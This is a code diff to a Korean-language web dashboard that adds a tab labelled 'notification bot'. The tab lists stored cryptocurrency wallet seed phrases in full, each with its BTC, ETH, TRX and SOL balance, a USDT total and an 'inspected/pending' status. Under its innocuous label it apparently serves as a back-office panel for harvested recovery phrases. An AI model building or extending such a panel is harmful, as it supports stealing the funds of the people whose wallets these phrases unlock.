@@ -171,6 +171,23 @@
     tr:hover td { background: rgba(124,111,255,.04); }
     .no-data { text-align: center; color: var(--muted); padding: 36px; font-size: 13px; }
 
+    /* ===== SEED CARD ===== */
+    .seed-card {
+      background: var(--bg3); border: 1px solid var(--border); border-radius: 12px;
+      padding: 14px 16px; display: flex; flex-direction: column; gap: 8px;
+    }
+    .seed-card.has-balance { border-color: var(--ac); background: rgba(124,111,255,.07); }
+    .seed-card-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-wrap: wrap; }
+    .seed-phrase { font-family: monospace; font-size: 13px; color: var(--fg); word-break: break-all; flex: 1; }
+    .seed-checked { font-size: 11px; padding: 2px 8px; border-radius: 20px; white-space: nowrap; }
+    .seed-checked.done { background: rgba(80,200,120,.18); color: #5cc87a; }
+    .seed-checked.pending { background: rgba(200,200,80,.12); color: #c8c84a; }
+    .seed-balance { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 4px; }
+    .seed-bal-item { font-size: 12px; }
+    .seed-bal-item b { color: var(--ac); }
+    .seed-date { font-size: 11px; color: var(--muted); }
+    .seed-total-usdt { font-size: 14px; font-weight: 700; color: var(--ok); }
+
     /* ===== PAGINATION ===== */
     .pagination { display: flex; gap: 8px; justify-content: center; margin-top: 16px; align-items: center; }
     .page-info { font-size: 13px; color: var(--muted); }
@@ -255,6 +272,9 @@
     <button class="tab-btn" data-tab="sectionRecords" onclick="showTab('sectionRecords');loadRecords(1)">
       <span class="icon">📊</span><span>채굴 내역</span>
     </button>
+    <button class="tab-btn" data-tab="sectionSeeds" onclick="showTab('sectionSeeds');loadSeeds(1)">
+      <span class="icon">📡</span><span>알림봇</span>
+    </button>
     <button class="tab-btn" data-tab="sectionProfile" onclick="showTab('sectionProfile');loadProfile()">
       <span class="icon">👤</span><span>내 정보</span>
     </button>
@@ -296,6 +316,24 @@
           </table>
         </div>
         <div class="pagination" id="recordsPagination"></div>
+      </div>
+    </div>
+
+    <!-- 알림봇(시드) 탭 -->
+    <div class="tab-panel" id="sectionSeeds">
+      <div class="glass-card">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;">
+          <h2 style="margin:0">📡 알림봇</h2>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <span id="seedsTotalBadge" style="font-size:12px;color:var(--muted);"></span>
+            <button class="btn-ghost btn-sm" onclick="loadSeeds(_seedsPage)">새로고침</button>
+            <button class="top-logout" onclick="doLogout()" style="font-size:12px;">세션 종료</button>
+          </div>
+        </div>
+        <div id="seedsList" style="display:flex;flex-direction:column;gap:12px;">
+          <div class="loading-center"><div class="spinner"></div></div>
+        </div>
+        <div id="seedsPagination" style="display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin-top:16px;"></div>
       </div>
     </div>
 
@@ -534,6 +572,77 @@
       if (!r.ok) { showToast(d.error || '저장 실패', 'err'); return; }
       showToast('메신저 ID가 저장되었습니다.', 'ok');
     } catch { showToast('저장 실패', 'err'); }
+  }
+
+  // ===== 알림봇 (시드 목록) =====
+  let _seedsPage = 1;
+
+  async function loadSeeds(page) {
+    _seedsPage = page || 1;
+    const list = document.getElementById('seedsList');
+    const pager = document.getElementById('seedsPagination');
+    const badge = document.getElementById('seedsTotalBadge');
+    list.innerHTML = '<div class="loading-center"><div class="spinner"></div></div>';
+    pager.innerHTML = '';
+    try {
+      const r = await fetch(`${API}/api/user/seeds?token=${_token}&page=${_seedsPage}&pageSize=10`);
+      if (!r.ok) { if (r.status === 401) { clearSession(); showLogin(); return; } throw new Error((await r.json()).error || '오류'); }
+      const data = await r.json();
+      badge.textContent = '총 ' + data.total + '건';
+      if (!data.seeds || !data.seeds.length) {
+        list.innerHTML = '<div class="no-data">알림 기록이 없습니다.</div>';
+        return;
+      }
+      list.innerHTML = data.seeds.map(s => {
+        const hasBalance = s.btc > 0 || s.eth > 0 || s.tron > 0 || s.sol > 0 || s.balance > 0;
+        const balItems = [
+          s.btc  > 0 ? `<span class="seed-bal-item">BTC <b>${s.btc.toFixed(8)}</b></span>` : '',
+          s.eth  > 0 ? `<span class="seed-bal-item">ETH <b>${s.eth.toFixed(8)}</b></span>` : '',
+          s.tron > 0 ? `<span class="seed-bal-item">TRX <b>${s.tron.toFixed(6)}</b></span>` : '',
+          s.sol  > 0 ? `<span class="seed-bal-item">SOL <b>${s.sol.toFixed(6)}</b></span>` : '',
+        ].filter(Boolean).join('');
+        const totalUsdt = Number(s.usdt_balance) || Number(s.balance) || 0;
+        return `<div class="seed-card${hasBalance ? ' has-balance' : ''}">
+          <div class="seed-card-top">
+            <span class="seed-phrase">${esc(s.phrase)}</span>
+            <span class="seed-checked ${s.checked ? 'done' : 'pending'}">${s.checked ? '✅ 검수완료' : '⏳ 대기'}</span>
+          </div>
+          ${hasBalance ? `<div class="seed-balance">${balItems}</div>
+          <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px;">
+            <span class="seed-total-usdt">≈ ${totalUsdt.toFixed(4)} USDT</span>
+            <span class="seed-date">${fmtDate(s.at)}</span>
+          </div>` : `<div class="seed-date">${fmtDate(s.at)}</div>`}
+        </div>`;
+      }).join('');
+      renderSmartPager('seedsPagination', _seedsPage, Math.ceil(data.total / 10), 'loadSeeds');
+    } catch (e) {
+      list.innerHTML = `<div class="no-data">${esc(e.message)}</div>`;
+    }
+  }
+
+  function renderSmartPager(containerId, currentPage, totalPages, fnName) {
+    const el = document.getElementById(containerId);
+    if (!el || totalPages <= 1) { if (el) el.innerHTML = ''; return; }
+    const pages = [];
+    if (totalPages <= 7) {
+      for (let i = 1; i <= totalPages; i++) pages.push(i);
+    } else {
+      pages.push(1);
+      if (currentPage > 4) pages.push('…');
+      const from = Math.max(2, currentPage - 2);
+      const to   = Math.min(totalPages - 1, currentPage + 2);
+      for (let i = from; i <= to; i++) pages.push(i);
+      if (currentPage < totalPages - 3) pages.push('…');
+      pages.push(totalPages);
+    }
+    const btnStyle = (p) => p === currentPage
+      ? 'background:var(--ac);color:#fff;border-color:var(--ac);'
+      : '';
+    el.innerHTML = pages.map(p =>
+      p === '…'
+        ? `<span style="padding:4px 2px;color:var(--muted);line-height:32px;">…</span>`
+        : `<button class="btn-ghost btn-sm" style="${btnStyle(p)}" onclick="${fnName}(${p})">${p}</button>`
+    ).join('');
   }
 
   // ===== 유틸 =====
